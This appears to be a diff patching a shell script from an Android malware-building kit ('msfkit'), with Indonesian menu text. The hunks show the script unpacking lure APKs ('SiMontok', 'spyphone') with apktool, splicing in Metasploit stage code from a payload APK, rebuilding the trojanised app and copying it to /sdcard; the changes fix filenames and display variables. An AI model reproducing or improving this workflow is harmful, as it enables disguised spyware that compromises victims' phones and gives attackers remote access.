@@ -736,7 +736,7 @@ echo "                   wait for 35 minutes              "
 echo $cy
 cd && cd msfkit && cd Payload
 mv -f SiMontok.apk ../Malware && cd && cd msfkit && cd Malware
-apktool d SiMontok.apk -o simontok && rm -fr Simontok.apk
+apktool d SiMontok.apk -o simontok && rm -fr SiMontok.apk
 apktool d payload.apk -o payload && rm -fr payload.apk && cd
 cd msfkit/Malware && rm -fr simontok/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage simontok/smali/com/metasploit/stage && cd
@@ -766,7 +766,7 @@ read -p "masukan pilihan : " pi
 
 spy(){
 ipori
-echo $bi
+echo $me
 clear
 mallware
 echo $hi"                 wait for 35 minutes            "
@@ -778,14 +778,13 @@ apktool d payload.apk -o payload && rm -fr payload.apk && cd
 cd msfkit/Malware && rm -fr spyphone/smali/com/metasploit/stage
 mv -f payload/smali/com/metasploit/stage spyphone/smali/com/metasploit/stage && cd
 cd msfkit/Malware && apktool b spyphone -o spyphone.apk && cd
-cd msfkit/Malware && mv -f SimontokVIP.apk /sdcard && cd
+cd msfkit/Malware && mv -f spyphone.apk /sdcard && cd
 cd msfkit/Malware && rm -fr *
 echo $hi
 echo "selesai"
 echo "----------------------------------------------------"
 sleep 7
 _pill
-bck
 }
 
 mlwr(){
